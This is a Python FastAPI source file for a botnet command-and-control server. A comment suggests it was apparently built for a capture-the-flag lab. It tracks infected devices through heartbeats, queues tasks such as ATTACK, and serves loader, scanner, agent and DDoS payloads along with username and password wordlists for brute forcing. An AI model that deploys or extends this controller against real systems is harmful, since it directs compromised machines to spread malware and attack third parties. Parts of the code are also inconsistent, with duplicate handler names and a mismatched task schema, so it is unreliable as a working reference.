"""
C2 Controller — FastAPI + SQLite
Shared DB with report_server.py

Endpoints:
  POST /heartbeat   — agent check-in, enriches existing device row
  GET  /tasks       — agent polls; auto-generates tasks from templates on first visit
  POST /result      — agent submits task result
  POST /add         — assign a task to an agent
"""

import sqlite3
import datetime
import os
import uuid
import json
import io
import inspect

from fastapi import FastAPI, HTTPException
from fastapi.responses import FileResponse, PlainTextResponse
from pydantic import BaseModel
from typing import Any

this_path = os.path.dirname(inspect.stack()[0][1])
app = FastAPI(title="C2 Controller")

PORT = int(os.getenv("REPORT_PORT", 5000))
default_db_path = os.path.join(this_path, "../db/botnet.db")
DB   = os.getenv("DB_PATH", default_db_path)


# ─────────────────────────────────────────
# Database
# ─────────────────────────────────────────

def get_con():
    con = sqlite3.connect(DB, check_same_thread=False)
    con.row_factory = sqlite3.Row # what the fuck is this for?
    con.execute("PRAGMA journal_mode=WAL")  # safe for multi-process shared DB
    return con

# ─────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────

def generate_tasks_for_device(con, device_id: str):
    """Stamp out one task per template for this device."""
    templates = con.execute(
        "SELECT template_id, type, params FROM task_templates"
    ).fetchall()

    now = datetime.datetime.now(datetime.timezone.utc)
    for t in templates:
        con.execute("""
            INSERT INTO tasks (task_id, template_id, device_id, type, params, status, created_at)
            VALUES (?, ?, ?, ?, ?, 'pending', ?)
        """, (str(uuid.uuid4()), t["template_id"], device_id, t["type"], t["params"], now))


def device_has_tasks(con, device_id: str) -> bool:
    row = con.execute(
        "SELECT 1 FROM tasks WHERE device_id = ? LIMIT 1", (device_id,)
    ).fetchone()
    return row is not None


# ─────────────────────────────────────────
# Schemas
# ─────────────────────────────────────────

class HeartbeatPayload(BaseModel):
    device_id: str
    cpu_load: float
    memory: float
    uptime: float
    arch: str
    ip: str


class ResultPayload(BaseModel):
    device_id: str
    task_id: str
    result: Any


# VALID_TASKS = {"PING", "SLEEP", "BENCHMARK", "KILL_COMPETITOR"}
VALID_TASKS = {"PING", "SLEEP", "ATTACK", "STOP"}  # later implement the rest

class AddPayload(BaseModel):
    device_id: str
    task: str

# ────────────────────────────────────────
# Routes
# ─────────────────────────────────────────


@app.post("/add", status_code=204)
def add_task(payload: AddPayload):
    if payload.task not in VALID_TASKS:
        raise HTTPException(status_code=400, detail=f"unknown task, valid: {VALID_TASKS}")

    con = get_con()
    if not con.execute("SELECT 1 FROM devices WHERE device_id = ?", (payload.device_id,)).fetchone():
        con.close()
        raise HTTPException(status_code=404, detail="device not found")

    con.execute("""
        INSERT INTO tasks (device_id, task, status, created_at)
        VALUES (?, ?, 'pending', ?)
    """, (payload.device_id, payload.task, datetime.datetime.now(datetime.timezone.utc)))
    con.commit()
    con.close()


@app.post("/heartbeat", status_code=204)
def heartbeat(payload: HeartbeatPayload):
    """
    Agent check-in. Updates metrics on an existing device row.
    If the device isn't in the DB yet (never seen by report server),
    it is inserted here so the CTF still works standalone.
    """
    con = get_con()
    now = datetime.datetime.now(datetime.timezone.utc)
    con.execute("""
        INSERT INTO devices (device_id, ip, arch, cpu_load, memory, uptime, first_seen, last_seen)
        VALUES (:device_id, :ip, :arch, :cpu_load, :memory, :uptime, :now, :now)
        ON CONFLICT(device_id) DO UPDATE SET
            ip       = excluded.ip,
            arch     = excluded.arch,
            cpu_load = excluded.cpu_load,
            memory   = excluded.memory,
            uptime   = excluded.uptime,
            last_seen = excluded.last_seen
    """, {**payload.model_dump(), "now": now})
    con.commit()
    con.close()

@app.get("/tasks")
def get_tasks(device_id: str):
    con = get_con()

    rows = con.execute("""
        SELECT id, task
        FROM tasks
        WHERE device_id = ? AND status = 'pending'
        ORDER BY created_at ASC
    """, (device_id,)).fetchall()

    if not rows:
        con.close()
        return "CLEAR"

    # Grab the single oldest pending task from the list
    first_task = rows[0]
    task_id = first_task["id"]
    task_name = first_task["task"]

    # Update its status in the SQLite DB to 'dispatched' using its unique ID
    con.execute(
        "UPDATE tasks SET status = 'dispatched' WHERE id = ?",
        (task_id,)
    )
    con.commit()
    con.close()

    # Return the clean text format that the ESP32's .indexOf() parser expects
    # Example output sent over Wi-Fi: "TASK_ID:14|CMD:ATTACK"
    return f"TASK_ID:{task_id}|CMD:{task_name}"


@app.get("/payload/loader")
def get_payload(device_id: str):
    binary_path = os.path.join(this_path, "../bin/loader_amd64")
    return FileResponse(
            path=binary_path,
            media_type="application/octet-stream",
            filename="loader_amd64"
            )

@app.get("/payload/scanner")
def get_payload(device_id: str):
    binary_path = os.path.join(this_path, "../bin/scanner_amd64")
    return FileResponse(
            path=binary_path,
            media_type="application/octet-stream",
            filename="scanner_amd64"
            )

@app.get("/payload/agent")
def get_payload(device_id: str):
    binary_path = os.path.join(this_path, "../bot/agent.sh")
    return FileResponse(
            path=binary_path,
            media_type="application/octet-stream",
            filename="agent.sh"
            )

@app.get("/payload/ddos")
def get_payload(device_id: str):
    binary_path = os.path.join(this_path, "../bin/dos.sh")
    return FileResponse(
            path=binary_path,
            media_type="application/octet-stream",
            filename="dos.sh"
            )

@app.get("/wordlist/users")
def get_payload(device_id: str):
    binary_path = os.path.join(this_path, "../src/testuser.txt")
    return FileResponse(
            path=binary_path,
            media_type="application/octet-stream",
            filename="testuser.txt"
            )

@app.get("/wordlist/passwords")
def get_payload(device_id: str):
    binary_path = os.path.join(this_path, "../src/testpass.txt")
    return FileResponse(
            path=binary_path,
            media_type="application/octet-stream",
            filename="testpass.txt"
            )

@app.post("/busy")
def post_busy(busystatus: int, device_id: str):
    if busystatus > 1:
        busystatus = 1

    con = get_con()
    con.execute("""
        UPDATE devices
        SET busy = ?
        WHERE device_id = ?
    """, [busystatus, device_id])
    con.commit()
    con.close()

# this is just a transparent way for the agent to access the current instruction in the db for them
@app.get("/inst", response_class=PlainTextResponse)
def get_inst(device_id: str):
    con = get_con()
    row = con.execute("""
        SELECT instruction
        FROM instructions
        WHERE device_id = (?) AND status = 0
    """, [device_id]).fetchone()
    con.close()

    if row is None or row[0] is None:
        return "none"

    print(f"returning inst: {row[0]}")
    return row[0]

@app.post("/inst")
def post_inst(device_id: str, status: int):
    con = get_con()
    con.execute("""
        UPDATE instructions
        SET status = (?)
        WHERE device_id = (?)
    """, [status, device_id])
    con.commit()
    con.close()

@app.post("/infected")
def post_infected(device_id: str):
    con = get_con()
    con.execute("""
        UPDATE devices
        SET infected = 1
        WHERE device_id = ?
    """, [device_id])
    con.commit()
    con.close()

@app.post("/result", status_code=204)
def post_result(payload: ResultPayload):
    con = get_con()

    task = con.execute(
        "SELECT id FROM tasks WHERE id = ?", (payload.task_id,)
    ).fetchone()

    if not task:
        con.close()
        raise HTTPException(status_code=404, detail="task not found")

    now = datetime.datetime.now(datetime.timezone.utc).isoformat()
    con.execute("""
        INSERT INTO results (task_id, device_id, result, received_at)
        VALUES (?, ?, ?, ?)
    """, (payload.task_id, payload.device_id, json.dumps(payload.result), now))

    con.execute(
        "UPDATE tasks SET status = 'done' WHERE id = ?", (payload.task_id,)
    )

    con.commit()
    con.close()
